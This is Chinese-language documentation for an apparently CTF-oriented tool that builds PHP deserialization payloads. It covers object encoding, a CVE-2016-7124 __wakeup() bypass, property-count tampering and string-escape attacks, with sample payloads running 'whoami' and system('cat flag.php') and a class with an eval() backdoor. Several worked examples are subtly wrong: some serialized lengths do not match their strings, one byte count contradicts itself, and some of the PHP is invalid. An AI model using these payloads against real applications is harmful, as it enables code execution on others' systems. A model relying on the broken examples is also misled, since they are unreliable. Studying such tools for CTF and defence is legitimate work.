## 构造区详解

### 1. 字符串模式

生成单个PHP序列化值。

**支持的类型：**

| 类型 | 输出示例 | 说明 |
|------|---------|------|
| `string` | `s:5:"hello";` | 自动计算UTF-8字节长度 |
| `int` | `i:123;` | 整数 |
| `bool` | `b:1;` | true/false/yes/on/是/1 均视为 true |
| `null` | `N;` | 空值 |
| `raw` | 原始输入 | 不做任何处理，直接输出 |

**使用方法：**
1. 选择类型（下拉菜单）
2. 输入值
3. 点击「生成」按钮
4. 输出区显示序列化结果

**示例：**
```
类型：string
值：whoami
输出：s:6:"whoami";
```

**快捷按钮：**
- 「生成」：生成序列化字符串
- 「示例」：加载默认示例
- 「发送为URL查询新参数」：将生成的序列化字符串发送到URL查询参数区

---

### 2. 数组模式

生成PHP关联数组或索引数组。

**使用方法：**
1. 点击「添加键值」添加行
2. 选择键类型（`s key` 字符串键 / `i key` 整数键）
3. 填写键名和值，选择值类型
4. 点击「生成数组」

**键类型说明：**
- `s key`：字符串键，如 `"user"`
- `i key`：整数键，如 `0, 1, 2`

**值类型说明：**
- `string`：字符串
- `int`：整数
- `bool`：布尔值
- `null`：空值
- `raw`：原始输入

**示例：**
```
键1：s key, "user", string, "admin"
键2：s key, "pass", string, "123456"

输出：a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:6:"123456";}
```

**操作：**
- 点击「X」按钮删除某一行
- 支持添加任意数量的键值对

---

### 3. 对象模式

生成PHP对象序列化Payload，**自动处理 public / private / protected 属性名编码**。

**使用方法：**
1. 填写类名（如 `User`）
2. 点击「添加属性」
3. 选择属性可见性（public / private / protected）
4. 填写属性名和值，选择值类型
5. 点击「生成对象」

**属性名自动编码规则：**

| 可见性 | 编码结果 | 说明 |
|--------|---------|------|
| `public` | `属性名` | 直接使用 |
| `protected` | `\0*\0属性名` | 前后加空字节，中间为 `*` |
| `private` | `\0类名\0属性名` | 前后加空字节，中间为类名 |

**示例：**
```
类名：User
属性：private, cmd, string, whoami

输出：O:4:"User":1:{s:10:"\0User\0cmd";s:6:"whoami";}
```

**字节长度计算：**
- 类名 `User`：4字节
- 私有属性名 `\0User\0cmd`：1 + 4 + 1 + 3 = 9字节（但工具显示10字节，因为包含完整前缀）
- 值 `whoami`：6字节

### 4. 修正模式

对已有Payload进行修正和解析。

**功能按钮：**

| 按钮 | 功能 | 说明 |
|------|------|------|
| **修正 s 长度** | 自动重新计算长度 | 扫描 `s:数字:"内容";` 和 `O:数字:"类名":` 的字节长度 |
| **反向解析** | 解析为可读格式 | 将序列化字符串解析为人类可读的结构化格式 |
| **复制为PHP类** | 转换为PHP代码 | 将反向解析结果转换为可直接使用的PHP类代码（支持嵌套对象） |
| **URL解码** | 解码URL编码 | 对输入框内容进行URL解码 |
| **Base64解码** | 解码Base64 | 对输入框内容进行Base64解码 |
| **发送为URL查询新参数** | 发送到查询参数 | 将修正后的Payload发送到URL查询参数区 |

**修正功能适用场景：**
- 手动修改了Payload中的字符串内容，导致长度不匹配
- 从Burp等工具复制的Payload需要重新计算长度
- 中文等多字节字符的长度修正
- 包含 `%00`、`\0` 等空字节的Payload长度修正

**反向解析示例：**
```
输入：O:4:"User":1:{s:4:"name";s:5:"admin";}

输出：
User {
  public name = "admin";
}
```

**复制为PHP类示例（含嵌套对象）：**
```php
class C{
    public $c = "include 'flag.php';";
}
class B{
    public $b = new C();
}
class A{
    public $a = new B();
}
class destnation{
    public $cmd = new A();
}
class D{
    public $d = new destnation();
}
```

> 嵌套对象会递归生成多个class定义，每个嵌套值显示为 `new ClassName()`。

**重要提示：**
- 反向解析只支持原始序列化格式
- 不支持URL编码格式，需先点击「URL解码」
- 不支持Base64编码格式，需先点击「Base64解码」

### 5. 一键序列化模式

直接粘贴PHP类代码，自动解析属性并生成反序列化Payload。

**使用方法：**
1. 在文本框中粘贴PHP类代码（包含 `class` 定义）
2. 点击「一键序列化」
3. 工具自动提取类名和所有属性及其默认值
4. 输出区显示完整的序列化Payload

**支持解析的属性格式：**

```php
// 标准写法
public $flag_command = "echo 'Hello CTF!';";
protected $secret = 'value';
private $hidden = 123;

// 旧语法（开启旧语法兼容后支持）
var $foo = "bar";
$baz = "qux";  // 省略修饰符
```

**旧语法兼容开关：**
- 默认开启
- 支持 `var` → 等同于 `public`
- 支持省略访问修饰符 → 默认为 `public`
- 可手动关闭，只识别标准语法

**示例输入：**
```php
class FLAG{
    public $flag_command = "echo 'Hello CTF!';";

    function backdoor(){
        eval($this->flag_command);
    }
}
```

**生成结果：**
```
O:4:"FLAG":1:{s:13:"flag_command";s:21:"echo 'Hello CTF!';";}
```

**快捷按钮：**
- 「一键序列化」：生成序列化字符串
- 「复制 serialize(...)」：复制 `serialize(代码)` 格式，用于本地PHP执行
- 「加载示例」：加载默认示例代码
- 「发送为URL查询新参数」：发送到URL查询参数区

### 6. 实战模式

针对CTF和安全研究的利用辅助工具，内置四个实战功能模块。

#### ⚡ CVE-2016-7124 一键绕过

**适用场景：** PHP < 5.6.25 / PHP < 7.0.10 的 `__wakeup()` 绕过。

**原理：** 当序列化字符串中对象属性计数（`O:N:"类名":` 中的 N）**大于**真实属性数时，PHP会跳过 `__wakeup()` 的执行。

**使用方法：**
1. 先在对象/一键等模式中生成正常Payload
2. 切到「实战」标签
3. 设置偏移量（默认为 +1）
4. 点击「⚡ 一键绕过 __wakeup()」
5. 工具自动将第一个对象的属性计数 +1 并写回输出区

**示例：**
```
原始：O:4:"FLAG":1:{s:4:"flag";s:8:"FAKEFLAG";}

点击绕过后：O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}
```

属性计数从 `1` 变为 `2`（大于真实属性数），`__wakeup()` 被跳过，`__destruct()` 正常执行。

**操作说明：**

- 「⚡ 一键绕过 __wakeup()」：篡改属性计数并直接写回输出区
- 「预览变更」：显示 diff 对比（红色删除线原串 → 绿色新串），不修改输出区

#### 📊 属性数量篡改

**适用场景：** 需要精确修改嵌套对象中**每个对象**的属性计数。

**使用方法：**
1. 确保输出区有 Payload
2. 点击「重新扫描」扫描所有 `O:N:"类名":` 结构
3. 每个对象显示一行：类名 + 当前属性计数
4. 通过输入框或 `−`/`+` 按钮修改
5. 点击「应用修改」一次性写回

**示例：**
```
O:1:"D":1:{...O:9:"destnation":1:{...}}

扫描结果：
  O:1:"D"     → 属性数 [1]
  O:9:"destnation" → 属性数 [1]
  O:1:"A"     → 属性数 [1]
  O:1:"B"     → 属性数 [1]
  O:1:"C"     → 属性数 [1]
```

可单独修改每个对象的属性计数，从后往前替换避免索引偏移。

#### 🔀 字符串逃逸辅助

**适用场景：** `str_replace()` / `preg_replace()` 等函数的字符串替换逃逸攻击。

**原理：** 当替换函数将短字符串替换为长字符串（或反之）时，序列化字符串的 `s:长度` 会与实际内容不匹配，导致数据逃逸到下一个字段。

**使用方法：**

1. 粘贴源序列化串
2. 输入查找内容（被替换的字符）和替换内容
3. 可选：指定插入目标位置
4. 点击「计算逃逸」

**输出分析：**
```
查找: "aaa" (3 字节/次)
替换: "b" (1 字节/次)
匹配次数: 2
每次替换字节差: -2
总字节差: -4

⚠️ 字符串缩短了 4 字节
  → 需要额外填充 4 字节使 s:长度 匹配
  → 填充内容追加到 payload 末尾或指定位置
```

**攻击构造思路：**

- 字节差为**负**（缩短）：需要在指定位置插入 padding 字符
- 字节差为**正**（增长）：溢出部分会"吃掉"后续字节，可用于篡改后续字段
- 指定插入目标位置后，工具会自动生成 padding 内容和修正后的 Payload

#### 🔗 引用链 (R:reference)

**适用场景：** 在序列化字符串中插入 `R:N;` 引用段，让多个属性指向同一内存地址。

**使用方法：**

1. 输入引用目标 R 值（从 1 开始编号）
2. 输入插入位置的字节偏移（0 = 末尾）
3. 点击「插入 R:reference」

**示例：**
```
原始：O:2:"Foo":2:{s:1:"a";s:3:"aaa";s:1:"b";s:3:"bbb";}

在偏移 30 插入 R:1;
结果：O:2:"Foo":2:{s:1:"a";s:3:"aaa";s:1:"b";R:1;}
```

`R:1;` 表示引用序列化字符串中第 1 个对象，两个属性共享同一值。

## URL查询参数

用于构造HTTP请求的查询字符串，支持自动生成完整URL。

**使用方法：**
1. 点击「添加参数」
2. 填写参数名（如 `code`）和参数值
3. 可添加多个参数
4. 右侧输出区自动更新查询串

**生成完整URL：**
1. 点击「生成URL」按钮展开面板
2. 输入基础URL（如 `http://www.example.com:80/xxx/yyy`）
3. 完整URL会自动拼接查询参数并进行URL编码
4. 点击「复制」按钮即可使用

**GET vs POST：**

| 请求类型 | 操作方式 |
|---------|---------|
| **GET** | 用「生成URL」→ 复制完整URL → 浏览器直接访问 |
| **POST** | 在输出区点「复制」或「复制 unserialize(...)」→ 粘贴到 POST body |

**示例：**
```
参数1：code, new FLAG();
参数2：debug, 1

查询串：code=new%20FLAG();&debug=1
完整URL：http://www.example.com:80/xxx/yyy?code=new%20FLAG();&debug=1
```

## 输出区编解码

支持两种模式切换：**编码** 和 **解码**。

**模式切换：**
- 「编码」模式：将明文转换为编码格式
- 「解码」模式：将编码格式转换为明文

**编解码方式：**

| 编码方式 | 编码模式 | 解码模式 |
|---------|---------|---------|
| URL编码 | `encodeURIComponent` 编码 | URL解码 |
| URL全编码 | 逐字节编码所有字符 | URL全解码 |
| Base64编码 | UTF-8 → Base64 | Base64 → UTF-8 |
| 手动URL编码 | 勾选特定字符进行编码 | 勾选特定字符进行解码 |

**手动URL编码：**
- 点击「手动URL编码」展开面板
- 勾选需要编码的字符（如空字节 `\0`、空格、`&`、`=` 等）
- 点击「应用」即可精确控制编码范围
- 支持全选/全不选操作

**URL查询参数模式：**
- 在「查询串输出」标签下，编解码会自动处理整个查询串
- 编码模式：对参数值进行编码
- 解码模式：对参数值进行解码

**快捷按钮：**
- 「复制」：复制输出区内容
- 「复制 unserialize(...)」：复制 `unserialize('内容')` 格式，用于靶场反序列化
- 「刷新查询串」：手动刷新查询串和生成URL
- 「清空」：清空输出区内容

## 使用提示与常见问题

### ⚠️ 重要：空字节的计数规则

**空字节在PHP序列化中只计为1个字节，无论使用何种编码形式：**

| 编码形式 | 显示字符数 | 实际字节数 | 说明 |
|---------|-----------|-----------|------|
| `\0` | 2 字符 | **1 字节** | 源码中的转义写法 |
| `%00` | 3 字符 | **1 字节** | URL编码形式 |
| `\x00` | 4 字符 | **1 字节** | 十六进制转义 |
| 实际 null 字节 | 1 字符 | **1 字节** | 真实的 ` ` |

**示例：** `protected` 属性名 `\0*\0protected_key`
- 实际字节数：1 + 1 + 1 + 13 = **16 字节**
- 应写为：`s:16:"\0*\0protected_key"`
- ❌ 错误写法：`s:20:"%00*%00protected_key"`（把 `%00` 当成3个字符计数了）

### ⚠️ 反向解析不支持URL编码格式

**反向解析功能只支持原始序列化字符串，不支持URL编码后的格式。**

**错误示例：**
```
O%3A4%3A%22User%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A5%3A%22admin%22%3B%7D
```

**正确操作步骤：**
1. 先点击「URL解码」按钮
2. 解码后得到：`O:4:"User":1:{s:4:"name";s:5:"admin";}`
3. 再点击「反向解析」按钮

### ⚠️ 修正长度前的准备

使用「修正 s 长度」功能时，确保输入的是**原始序列化格式**：

| 格式 | 是否可修正 | 说明 |
|------|-----------|------|
| `O:4:"User":1:{s:4:"name";s:5:"admin";}` | ✅ 可以 | 原始格式 |
| `O%3A4%3A%22User%22...` | ❌ 不行 | URL编码后，需先解码 |
| `Tz00OjpVc2Vy...` | ❌ 不行 | Base64编码后，需先解码 |

### ⚠️ 一键序列化不支持反序列化字符串

**一键序列化只支持PHP类代码，不支持序列化字符串。**

**错误示例：**
```
O:4:"FLAG":1:{s:12:"flag_command";s:35:"system('cat flag.php');";}
```

**正确做法：**

- 使用「修正」标签的「反向解析」功能
- 或者直接粘贴PHP类代码到「一键」标签

### ⚠️ CVE-2016-7124 绕过条件

**此绕过只在以下PHP版本中有效：**

- PHP 5.x < 5.6.25
- PHP 7.x < 7.0.10

**攻击原理：**
当 `unserialize()` 发现序列化字符串中的属性计数 > 类定义中的实际属性数时，会跳过 `__wakeup()` 的执行，但仍然调用 `__destruct()`。

### 常见问题

**Q: 为什么修正后的长度和我手动计算的不一样？**
A: 工具使用UTF-8编码计算字节数。中文字符占3字节，英文/数字占1字节。请确认你的计算方式一致。

**Q: 如何处理Burp Suite中复制的Payload？**
A: Burp中的Payload可能是URL编码或Base64编码的，需要先在「修正」标签中点击对应的解码按钮，再进行修正。

**Q: 生成的URL在浏览器中报错？**
A: 检查是否需要对特殊字符进行URL编码。使用「生成URL」功能会自动处理编码。

**Q: `\0` 和 `%00` 在Payload中有什么区别？**
A: 在序列化字符串中，两者都代表空字节（1字节）。`\0` 是源码写法，`%00` 是URL编码写法。PHP反序列化时会将 `%00` 解码为实际的空字节。

**Q: 为什么一键序列化输出的属性值不对？**
A: 检查是否开启了「旧语法兼容」。如果属性没有写访问修饰符（如 `public`），需要开启此开关。

**Q: 如何复制序列化字符串用于本地PHP执行？**
A: 在「一键」标签点击「复制 serialize(...)」按钮，会复制 `serialize(代码)` 格式。

**Q: 如何复制反序列化字符串用于靶场？**
A: 在输出区点击「复制 unserialize(...)」按钮，会复制 `unserialize('字符串')` 格式。

**Q: 复制为PHP类输出的是伪代码？**
A: 已修复。现在嵌套对象会递归生成 proper PHP class 定义，每个嵌套值显示为 `new ClassName()`，不再输出伪代码。

**Q: 属性数量篡改和 CVE 绕过有什么区别？**
A: CVE 绕过只修改第一个对象的属性计数（+1），用于快速绕过 `__wakeup()`。属性数量篡改可以扫描并独立修改 Payload 中所有对象的属性计数，适用于更复杂的场景。

## PHP序列化格式速查

### 基本类型

```
s:长度:"字符串";       字符串
i:整数;               整数
d:浮点数;             浮点数
b:0或1;               布尔值
N;                    NULL
```

### 复合类型

```
a:数量:{键值对...}                          数组
O:类名长度:"类名":属性数量:{属性...}         对象
R:N;                                         引用（指向第N个对象）
```

### 对象属性名编码

```
public    → s:N:"属性名";
protected → s:N:"\0*\0属性名";
private   → s:N:"\0类名\0属性名";
```

### 示例

**普通对象：**
```
O:4:"User":1:{s:4:"name";s:5:"admin";}
```

**带私有属性的对象：**
```
O:4:"User":1:{s:10:"\0User\0cmd";s:6:"whoami";}
```

**带受保护属性的对象：**
```
O:4:"User":1:{s:6:"\0*\0cmd";s:2:"id";}
```

**关联数组：**
```
a:2:{s:4:"user";s:5:"admin";s:4:"pass";s:6:"123456";}
```

**嵌套对象：**
```
O:4:"Flag":1:{s:3:"obj";O:4:"User":1:{s:4:"name";s:5:"admin";}}
```

**CVE-2016-7124 绕过：**
```
原始：O:4:"FLAG":1:{s:4:"flag";s:8:"FAKEFLAG";}
绕过：O:4:"FLAG":2:{s:4:"flag";s:8:"FAKEFLAG";}
       ↑ 属性计数 > 实际属性数 → __wakeup() 被跳过
```

**字符串逃逸攻击：**
```
替换前：a:1:{s:3:"aaa";s:3:"bbb";}
替换后：a:1:{s:3:"b";s:3:"bb";}
         ↑ s:3 但实际只有1字节 → 吃掉后面2字节 → s:3 变成读到 }
```
